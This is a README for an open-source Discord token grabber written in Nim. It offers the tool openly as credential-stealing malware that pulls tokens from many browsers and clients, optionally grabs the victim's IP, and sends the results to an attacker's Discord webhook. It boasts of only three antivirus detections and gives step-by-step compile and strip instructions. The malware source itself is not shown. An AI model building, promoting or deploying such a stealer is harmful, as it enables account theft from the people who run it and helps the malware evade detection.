<h1 align=center>NimGrabber</h1>

**First OSS Discord Token Grabber written in Nim** 

![𝚅𝚒𝚜𝚒𝚝𝚘𝚛𝚜](https://visitor-badge.laobi.icu/badge?page_id=NullCode1337.NimGrabber&title=Visitor) 

## Features
- Small size compared to Python loggers (410~kb)
- Written with pure libs (no need for DLLs)
- No caching, everything done on-time
- Supports a LOT of browsers and clients
- Optional IP Grabber (can be toggled in file)
- Wow only 3 detections

<p align=center>
   <img src="https://user-images.githubusercontent.com/70959549/134841402-059550fa-834f-49b2-b316-a21c3750eadb.png" alt="VirusTotal Scan Result"/>
</p>

## How to use
- **MUST: Install Nim [(using my guide)](https://gist.github.com/NullCode1337/95addeca955456c92aeb9fbc26f3615a)**
- Since this needs a Discord Webhook (like all things do), go create one
- Download repo as zip / git clone, and store somewhere
- Replace the webhook link, user ID and toggle whatever you need
- Run `Compile.bat`, which will sort out everything for you

Or if you want to do manually:
```bash
nimble install puppy
nimble install regex
nim c -d:danger --gc:arc -d:useMalloc --panics:on <file>.nim
strip -s <file>.exe
```

## Credits and stuff
1) **ME** ([NullCode1337](https://github.com/NullCode1337))
2) narimiran and [his legendary guide](https://github.com/narimiran/nim-basics)
3) [Yardanico](https://github.com/Yardanico), enthus1ast and Rika on Nim Discord

## Screenshots
- Without embed:

![Without embed](https://user-images.githubusercontent.com/70959549/135741426-ac45946f-f183-4297-9a50-f01279c793c4.png)

- With embed:

![With embed](https://user-images.githubusercontent.com/70959549/135741404-daa25f29-16bd-4d0e-866e-8ad269cb1ecb.png)

### TODO
- [X] Testing on PCs without Nim toolchain
- [X] Nicer upload (using embeds)
- [X] Make code less weird
- [ ] Token Checker
- [X] IP Grabber
